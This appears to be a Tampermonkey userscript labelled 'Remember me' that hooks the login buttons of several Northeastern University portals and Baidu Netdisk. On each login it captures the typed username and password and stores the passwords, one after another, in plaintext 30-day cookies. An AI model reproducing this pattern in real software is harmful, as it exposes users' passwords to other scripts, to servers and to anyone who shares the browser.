// ==UserScript==
// @name         Remember me
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       You
// @match        http://219.216.96.73/pyxx/login.aspx
// @match        http://ipgw.neu.edu.cn/srun_portal_pc.php?ac_id=1&
// @match        https://pan.baidu.com/
// @grant        none
// ==/UserScript==

(function() {
    function setCookie(cname, cvalue, exdays) {
        var d = new Date();
        d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
        var expires = "expires=" + d.toGMTString();
        document.cookie = cname + "=" + cvalue + "; " + expires;
    }

    function getCookie(cname) {
        var name = cname + "=";
        var ca = document.cookie.split(';');
        for (var i = 0; i < ca.length; i++) {
            var c = ca[i].trim();
            if (c.indexOf(name) == 0) {
                return c.substring(name.length, c.length);
            }
        }
        return "";
    }

    function logFunction(user, pw) {

        if ((user != null) && (pw != null)) {
            return (function h() {
                console.log('g')
                var cookie = getCookie(user.value)
                if (cookie == "") {
                    setCookie(user.value, pw.value, 30);
                } else if (cookie != "") {
                    var temp = cookie + '+' + pw.value
                    setCookie(user.value, temp, 30);
                }
            }
                   )

        }
    }
//东北大学研究生网
    var user_jwc = document.getElementById("ctl00_txtusername");
    var pw_jwc = document.getElementById("ctl00_txtpassword");
    var LogBotton_jwc = document.getElementById('ctl00_ImageButton1');
    if (LogBotton_jwc != null) {
        LogBotton_jwc.onclick = logFunction(user_jwc, pw_jwc)
    }
//ipgw.neu.edu.cn
    var form = document.forms.form2;
    if (typeof (form) != "undefined") {
        var user_gw = form.username;
        var pw_gw = form.password;
        var LogBotton_gw = document.getElementsByClassName('btn btn-primary')[0];
        LogBotton_gw.onclick = logFunction(user_gw, pw_gw);
    }
//bt.neu6.edu.cn
	var user_IPV6 = document.getElementsByName("username")[0];
	var pw_IPV6 = document.getElementsByName("password")[0];
	var LogBotton_IPV6 =document.getElementsByName("loginsubmit")[0];
	if (LogBotton_IPV6 != null) {
        LogBotton_IPV6.onclick = logFunction(user_IPV6, pw_IPV6)
    }
//baiduNetDisk
    setTimeout(function() {
        var AntiQRcode_bd = document.getElementById("TANGRAM__PSP_4__footerULoginBtn")
        if (AntiQRcode_bd != null) {
            AntiQRcode_bd.click()
            var user_bd = document.getElementById("TANGRAM__PSP_4__userName")
            var pw_bd = document.getElementById("TANGRAM__PSP_4__password")
            var LogBotton_bd = document.getElementById("TANGRAM__PSP_4__submit")
            if (LogBotton_bd != null) {
                LogBotton_bd.onclick = logFunction(user_bd, pw_bd);
            }
        }

    }, 800);

}
)();
